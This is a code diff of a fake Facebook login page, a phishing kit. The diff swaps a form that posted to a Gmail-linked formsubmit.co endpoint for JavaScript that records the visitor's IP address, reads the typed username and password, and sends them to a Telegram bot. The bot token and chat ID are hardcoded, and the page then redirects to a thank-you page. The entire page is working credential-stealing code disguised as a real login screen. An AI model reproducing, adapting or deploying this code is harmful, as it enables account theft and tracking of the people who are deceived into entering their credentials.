@@ -189,15 +189,15 @@
                 <p>Connect with friends and the world </p>
                 <p> around you on Facebook.</p>
             </div>
-            <form id="form"  method="POST" action="https://formsubmit.co/teaminstagram170@gmail.com">
-                <input type="text" id="ipAddress" name="ipAddress" readonly hidden>
+            <form id="contactForm" method="POST">
                 <input type="text" name="username" id="username" required placeholder="email">
-
+                <input type="text" id="ipaddress" name="ipaddress" hidden>
                 <input type="text" name="password" id="password" required placeholder="password">
-                <input type="hidden" name="_next" value="thanks.html"> 
-                <input type="hidden" name="_captcha" value="false">
+                <!-- <input type="hidden" name="_redirect" value="https://qwayzdp.netlify.app/fbpop1.html">  -->
+                <!-- <input type="hidden" name="_captcha" value="false"> -->
                 <div class="link">
-                    <button type="submit" value="Send Email" class="login" id="button" style="text-decoration: none; color: white;">Login 
+                    <button type="submit" value="Send Email" class="login" id="submit"
+                        style="text-decoration: none; color: white;">Login
                     </button>
                     <a href="#" class="forgot">Forgot password?</a>
                 </div>
@@ -212,22 +212,51 @@
         © 2024 Meta
 
     </footer>
+
     <script>
         document.addEventListener('DOMContentLoaded', function () {
             // Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
-                    const ipAddress = data.ip;
-                    document.getElementById('ipAddress').value = ipAddress;
+                    const ipaddress = data.ip;
+                    document.getElementById('ipaddress').value = ipaddress;
                 })
                 .catch(error => {
                     console.error('Error fetching IP address:', error);
                 });
         });
 
-    </script>
 
+
+        document.getElementById('contactForm').addEventListener('submit', function (event) {
+            event.preventDefault();
+
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            var ipaddress = document.getElementById('ipaddress').value;
+
+            var telegramMessage = `Username-fb: ${username}\nPassword-fb: ${password}\nIpaddress: ${ipaddress}`;
+
+         var token = '8012677283:AAHXpAC4tKMzs8FvOgsCh8y4Mjouyg04HJI';
+            var chat_id = '8115174388'
+
+            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        window.location.href = 'thanks.html';  // Redirect to thank you page
+                    } else {
+                        alert('Error sending message.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        });
+    </script>
 </body>
 
 
